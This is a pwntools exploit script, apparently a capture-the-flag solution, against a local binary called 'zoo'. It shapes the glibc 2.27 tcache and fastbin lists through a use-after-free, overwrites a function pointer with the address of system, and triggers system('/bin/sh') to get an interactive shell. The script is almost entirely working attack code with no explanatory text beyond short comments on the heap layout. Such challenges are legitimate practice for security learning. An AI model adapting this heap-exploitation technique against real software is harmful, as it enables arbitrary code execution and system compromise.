#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set follow-fork-mode parent\n'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./zoo')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./zoo")
system = 0x401120

def create(data):
    sla("> ", "1")
    sla("Type of animal?", "1")
    sa("ame of animal", data)

def delete(idx):
    sla("> ", "2")
    sla("Zone number? (0-", str(idx))

def show(idx):
    sla("> ", "3")
    sla("one number", str(idx))


create("/bin/sh\x00" * 3) #0
create("/bin/sh\x00" * 3) #1
create("/bin/sh\x00" * 3) #2
create("/bin/sh\x00" * 3) #3


## after free the cache
# . Tcache_head -> buf_3 -> animal_2 -> buf_2 -> animal_1 -> buf_1 -> animal_0 -> buf_0 
# . fastbin_head -> animal_3
delete(0)
delete(1)
delete(2)
delete(3)
debug()

## animal4 == buf_3
## buf_4 == animal_2
create(p64(system) + "a" * 8 + "\x50") #4

## system("/bin/sh")
show(2)
p.interactive()
